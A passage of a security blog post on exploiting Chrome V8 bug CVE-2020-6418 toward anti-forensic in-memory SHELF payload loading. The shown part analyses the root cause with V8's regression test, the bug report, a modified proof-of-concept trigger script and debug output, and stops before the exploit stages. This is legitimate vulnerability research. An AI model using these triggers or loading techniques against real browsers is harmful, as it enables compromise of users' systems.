<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>SHELF encounters of the elements kind - ulexec | blog</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="ulexec" /><meta name="description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&amp;rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year." /><meta name="keywords" content="Hugo, theme, even" />






<meta name="generator" content="Hugo 0.107.0 with theme even" />


<link rel="canonical" href="http://ulexec.github.io/post/2022-02-22-shelfchrome/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f73a6ffa72be6986c3a367201316a0ad5a90db5f09b95dc0bbaedb923d419e87.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="SHELF encounters of the elements kind" />
<meta property="og:description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ulexec.github.io/post/2022-02-22-shelfchrome/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-02-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-02-22T00:00:00+00:00" />

<meta itemprop="name" content="SHELF encounters of the elements kind">
<meta itemprop="description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year."><meta itemprop="datePublished" content="2022-02-22T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-02-22T00:00:00+00:00" />
<meta itemprop="wordCount" content="8379">
<meta itemprop="keywords" content="pwn,chrome," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SHELF encounters of the elements kind"/>
<meta name="twitter:description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">ulexec 의 연구</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">ulexec 의 연구</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">SHELF encounters of the elements kind</h1>

      <div class="post-meta">
        <span class="post-time"> 2022-02-22 </span>
        <div class="post-category">
            <a href="/categories/article/"> Article </a>
            </div>
          <span class="more-meta"> 8379 words </span>
          <span class="more-meta"> 40 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#cve-2020-6418">CVE-2020-6418</a>
          <ul>
            <li><a href="#regression-test-analysis">Regression Test Analysis</a></li>
            <li><a href="#root-cause-analysis">Root-Cause Analysis</a></li>
            <li><a href="#exploit-strategy">Exploit Strategy</a></li>
          </ul>
        </li>
        <li><a href="#achieving-relative-arbitrary-readwrite">Achieving Relative Arbitrary Read/Write</a></li>
        <li><a href="#achieving-unstable-arbitrary-readwrite">Achieving Unstable Arbitrary Read/Write</a></li>
        <li><a href="#achieving-stable-arbitrary-readwrite">Achieving Stable Arbitrary Read/Write</a></li>
        <li><a href="#obtaining-relevant-leaks">Obtaining relevant leaks</a>
          <ul>
            <li><a href="#leaking-chrome-base">Leaking Chrome base</a></li>
            <li><a href="#leaking-libc-base">Leaking Libc base</a></li>
            <li><a href="#leaking-the-process-stack">Leaking the process stack</a></li>
          </ul>
        </li>
        <li><a href="#achieving-a-stable-large-rwx-region">Achieving a stable large RWX region</a></li>
        <li><a href="#preparing-a-shelf-image">Preparing a SHELF image</a></li>
        <li><a href="#conclusion">Conclusion</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <p>This is a mirror of my article publsihed at <em>Tmp.0ut</em> zine volume 2. Original post can be found <a href="https://tmpout.sh/2/5.html">here</a>.</p>
<p>I&rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.</p>
<p>If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague <code>_Anonymous</code> from <em>Tmp.0ut</em> <a href="https://tmpout.sh/1/10/">wrote about</a> last year.</p>
<p>SHELF-based payloads have a series of incentives, primarily as to be able to reflectively deploy large dependency-safe payloads as ELF binaries, without the need to invoke any of the <code>execve</code> familiy of system calls.</p>
<p>Deploying SHELF payloads is not only convenient from a development perspective, but also from an anti-forensics perspective. This is because the analysis of SHELF images is often more complex than conventional ELF binaries or shellcode, since SHELF images are statically compiled but also position-independent. In addition, SHELF images can be crafted to avoid the use of common ELF data structures critical for image reconstruction, also leaving no process-hierarchy footprint in contrast to the <code>execve</code> family of system calls.</p>
<p>In conclusion, SHELF has great prospects to be used within the browser to reflectively load arbitrary payloads in the form of self-contained ELF binaries with anti-forensic characteristics.</p>
<p>In this article, I will demonstrate how SHELF loading can be achieved on a Chrome exploit, starting from an initial set of relative arbitrary read/write primitives to V8&rsquo;s heap.</p>
<p>I also wanted to present a concise analysis of a vulnerability that would grant these kinds of initial exploitation primitives. I will be covering a vulnerability I&rsquo;ve been recently analyzing, <code>CVE-2020-6418</code>. However, feel free to skip to the <em>Achieving Relative Arbitrary Read/Write</em> section if you are not interested in the root-cause analysis of this particular vulnerability.</p>
<p>I would like to apologize in advance if there are still some mistakes or wrong assertions I may have skipped over, or simply was unaware of during the creation of this article.</p>
<hr>
<h2 id="cve-2020-6418">CVE-2020-6418</h2>
<br />
<h3 id="regression-test-analysis">Regression Test Analysis</h3>
<p>If we check the bug issue for this vulnerability, we can observe that a <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js">regression</a> test file was committed, which will serve us as an intial PoC for the given vulnerability. This regression test looks as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Copyright 2020 the V8 project authors. All rights reserved.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Use of this source code is governed by a BSD-style license that can be
</span></span></span><span class="line"><span class="cl"><span class="c1">// found in the LICENSE file.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Flags: --allow-natives-syntax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">empty</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">a</span><span class="p">.</span><span class="nx">pop</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">empty</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">,</span> <span class="nx">p</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nb">Object</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">get</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">,</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">f</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can also inspect the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">bug report</a> for a nice overview of the vulnerability:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Incorrect side effect modelling for JSCreate
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring the Map of an object. From the documentation: &#34;This information can be either &#34;reliable&#34;, meaning that the object is guaranteed to have one of these maps at runtime, or &#34;unreliable&#34;, meaning that the object is guaranteed to have HAD one of these maps.&#34;. In the latter case, the caller has to ensure that the object has the correct type, either by using CheckMap nodes or CodeDependencies.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until it finds the node creating the object in question and, at the same time, marks the result as unreliable if it encounters a node without the kNoWrite flag [2], indicating that executing the node could have side-effects such as changing the Maps of an object. There is a mistake in the handling of kJSCreate [3]: if the object in question is not the output of kJSCreate, then the loop continues *without* marking the result as unreliable. This is incorrect because kJSCreate can have side-effects, for example by using a Proxy as third argument to Reflect.construct. The bug can then for example be triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles during the unexpected side effect.
</span></span></code></pre></td></tr></table>
</div>
</div><p>As seen in the bug report, the vulnerability consists of incorrect side effect modeling for <code>JSCreate</code>. In other words, arbitrary JavaScript code can be invoked at some point during the processing of <code>JSCreate</code> in Ignition (V8&rsquo;s interpreter) generated instructions, that would impact the behavior of Turbofan&rsquo;s JIT compilation pipeline.</p>
<p>If we modify the provided regression test to return the value popped from the array <code>a</code>, we will see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ out.gn/x64.release/d8 --allow-natives-syntax ../regress.js
</span></span><span class="line"><span class="cl"><span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The value popped after the third call to function <code>main</code> is <code>0</code>, when in reality it should have returned <code>2</code>. This means that the call to <code>main(p)</code> is somehow influencing the behavior of array <code>a</code>&rsquo;s elements. We can see this clearly with the following modifications to the regression test:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">empty</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">pop</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">empty</span><span class="p">,</span> <span class="nx">arguments</span><span class="p">,</span> <span class="nx">p</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nb">Object</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">get</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{},</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">f</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">(</span><span class="nx">empty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">main</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">main</span><span class="p">(</span><span class="nx">p</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we run the previous script we will see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ out.gn/x64.release/d8 --allow-natives-syntax ./regress.js          
</span></span><span class="line"><span class="cl">4.735317402428105e-270
</span></span></code></pre></td></tr></table>
</div>
</div><p>The elements kind of array <code>a</code> has transitioned from <code>PACKED_DOUBLE_ELEMENTS</code> to <code>PACKED_ELEMENTS</code> however, popped values of <code>a</code> via <code>Array.prototype.pop</code> still return elements of type <code>double</code>. This transition of <em>element kind</em> can be shown in the diagram below, showing the allowed element kinds transitions within V8&rsquo;s JSArrays:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/Screenshot%202021-05-03%20at%2013.00.23%201.png" /></div>
<p>At this point, we can only speculate what is provoking this behavior. However, based on observed triage of the regression test, this change of <em>elements kind</em> is likely provoked by the <code>Proxy</code> function, redeclaring <code>a[0]</code> indexed property as an <code>JSObject</code> instead of a <code>double</code> value.</p>
<p>We can also suspect that this redeclaration of one of the elements of <code>a</code> has likely provoked V8 to reallocate the array, propagating a different <em>elements kind</em> to <code>a</code>, converting <code>a</code>&rsquo;s elements&rsquo; to <code>HeapNumber</code> objects from <code>double</code> values. However, it&rsquo;s likely that the <em>elements kind</em> inferred by <code>Array.prototype.pop</code> is incorrect, as <code>double</code> values are still being retrieved.</p>
<p>This can be shown in the following <code>d8</code> run below, in which calls to the native function <code>%DebugPrint</code> have been placed in the appropriate places in the PoC script before and after the transition of elements kind:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">$</span> <span class="nx">out</span><span class="p">.</span><span class="nx">gn</span><span class="o">/</span><span class="nx">x64</span><span class="p">.</span><span class="nx">debug</span><span class="o">/</span><span class="nx">d8</span> <span class="o">--</span><span class="nx">allow</span><span class="o">-</span><span class="nx">natives</span><span class="o">-</span><span class="nx">syntax</span> <span class="p">..</span><span class="o">/</span><span class="nx">regress</span><span class="p">.</span><span class="nx">js</span>
</span></span><span class="line"><span class="cl"><span class="c1">//----------------------------[BEFORE]--------------------------------
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">DebugPrint</span><span class="o">:</span> <span class="mh">0x3d04080c6031</span><span class="o">:</span> <span class="p">[</span><span class="nx">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">map</span><span class="o">:</span> <span class="mh">0x3d0408281909</span> <span class="o">&lt;</span><span class="nx">Map</span><span class="p">(</span><span class="nx">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype</span><span class="o">:</span> <span class="mh">0x3d040824923d</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3d04080c6001</span> <span class="o">&lt;</span><span class="nx">FixedDoubleArray</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">PACKED_DOUBLE_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">properties</span><span class="o">:</span> <span class="mh">0x3d04080406e9</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">#</span><span class="nx">length</span><span class="o">:</span> <span class="mh">0x3d04081c0165</span> <span class="o">&lt;</span><span class="nx">AccessorInfo</span><span class="o">&gt;</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">accessor</span> <span class="nx">descriptor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span><span class="o">:</span> <span class="mh">0x3d04080c6001</span> <span class="o">&lt;</span><span class="nx">FixedDoubleArray</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="mi">0</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span> <span class="mf">1.1</span>
</span></span><span class="line"><span class="cl">           <span class="mi">2</span><span class="o">:</span> <span class="mf">1.2</span>
</span></span><span class="line"><span class="cl">           <span class="mi">3</span><span class="o">:</span> <span class="mf">1.3</span>
</span></span><span class="line"><span class="cl">           <span class="mi">4</span><span class="o">:</span> <span class="mf">1.4</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x3d0408281909</span><span class="o">:</span> <span class="p">[</span><span class="nx">Map</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">type</span><span class="o">:</span> <span class="nx">JS_ARRAY_TYPE</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">instance</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">inobject</span> <span class="nx">properties</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">elements</span> <span class="nx">kind</span><span class="o">:</span> <span class="nx">PACKED_DOUBLE_ELEMENTS</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">unused</span> <span class="nx">property</span> <span class="nx">fields</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="kr">enum</span> <span class="nx">length</span><span class="o">:</span> <span class="nx">invalid</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">back</span> <span class="nx">pointer</span><span class="o">:</span> <span class="mh">0x3d04082818e1</span> <span class="o">&lt;</span><span class="nx">Map</span><span class="p">(</span><span class="nx">HOLEY_SMI_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype_validity</span> <span class="nx">cell</span><span class="o">:</span> <span class="mh">0x3d04081c0451</span> <span class="o">&lt;</span><span class="nx">Cell</span> <span class="nx">value</span><span class="o">=</span> <span class="mi">1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">instance</span> <span class="nx">descriptors</span> <span class="err">#</span><span class="mi">1</span><span class="o">:</span> <span class="mh">0x3d04082498c1</span> <span class="o">&lt;</span><span class="nx">DescriptorArray</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">transitions</span> <span class="err">#</span><span class="mi">1</span><span class="o">:</span> <span class="mh">0x3d040824990d</span> <span class="o">&lt;</span><span class="nx">TransitionArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span><span class="nx">Transition</span> <span class="nx">array</span> <span class="err">#</span><span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">     <span class="mh">0x3d0408042f75</span> <span class="o">&lt;</span><span class="nx">Symbol</span><span class="o">:</span> <span class="p">(</span><span class="nx">elements_transition_symbol</span><span class="p">)</span><span class="o">&gt;:</span> <span class="p">(</span><span class="nx">transition</span> <span class="nx">to</span> <span class="nx">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mh">0x3d0408281931</span> <span class="o">&lt;</span><span class="nx">Map</span><span class="p">(</span><span class="nx">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">prototype</span><span class="o">:</span> <span class="mh">0x3d040824923d</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nx">constructor</span><span class="o">:</span> <span class="mh">0x3d0408249111</span> <span class="o">&lt;</span><span class="nx">JSFunction</span> <span class="nb">Array</span> <span class="p">(</span><span class="nx">sfi</span> <span class="o">=</span> <span class="mh">0x3d04081cc2dd</span><span class="p">)</span><span class="o">&gt;</span>
